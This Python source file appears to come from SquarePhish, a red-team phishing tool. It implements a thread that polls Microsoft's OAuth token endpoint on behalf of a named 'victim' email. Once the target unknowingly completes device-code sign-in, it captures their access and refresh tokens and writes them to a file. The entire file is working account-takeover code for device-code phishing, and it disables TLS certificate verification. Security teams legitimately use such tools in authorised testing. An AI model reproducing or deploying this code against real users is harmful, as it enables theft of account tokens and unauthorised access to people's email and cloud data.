# Copyright 2022 Secureworks
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import json
import time
import requests
import logging
import datetime
import threading
from squarephish.utils import HTTP_HEADERS


class AuthPoll(threading.Thread):
    """Custom threading class to poll for authentication"""

    def __init__(
        self,
        target_email: str,
        devicecode_response: dict,
        url: str,
        data: str,
    ):
        """Initialize threading class

        :param target_email:        Victim email address
        :param devicecode_response: OAuth device code response
        :param url:                 Mircosoft OAuth token URL
        :param data:                grant_type, client_id, code
        """
        super(AuthPoll, self).__init__()
        self.target_email = target_email
        self.devicecode_response = devicecode_response
        self.url = url
        self.data = data

    # Poll for user authentication
    def run(self, *args, **kwargs):
        """Continue to poll the MS token endpoint for valid authentication from
        the given victim"""
        expires_in = int(self.devicecode_response["expires_in"]) / 60
        end_delta = datetime.timedelta(minutes=expires_in)
        stop_time = datetime.datetime.now() + end_delta

        while True:
            logging.info(f"[{self.target_email}] Polling for user authentication...")
            resp = requests.post(
                self.url,
                headers=HTTP_HEADERS,
                data=self.data,
                verify=False,
            )

            # Handle debugging
            logging.debug(f"[{self.target_email}] Device code polling response:\n{resp.json()}")  # fmt: skip

            # Handle successful auth
            if resp.status_code == 200:
                break

            # Handle bad response
            if resp.json()["error"] != "authorization_pending":
                logging.error(f"[{self.target_email}] Invalid response from /token:\n{resp.json()}")  # fmt: skip
                return False

            # Handle device code expiration/timeout
            if datetime.datetime.now() >= stop_time:
                logging.error(f"[{self.target_email}] Device code expired.")
                return False

            # Wait the provided interval time between polls
            time.sleep(int(self.devicecode_response["interval"]))

        # Set response once polling proves true
        tokenResponse = resp.json()

        # Attempt to write the data to a file, but if we fail output it to the
        # screen so the user can do what they want with the data
        try:
            with open(f"{self.target_email}.tokeninfo.json", "w") as f:
                json.dump(tokenResponse, f)

            logging.info(f"[{self.target_email}] Token info saved to {self.target_email}.tokeninfo.json")  # fmt: skip

        except Exception as e:
            logging.error(f"[{self.target_email}] Failed to write token info: {e}")
            logging.info(f"[{self.target_email}] Token Info:\n{tokenResponse}")

        return True

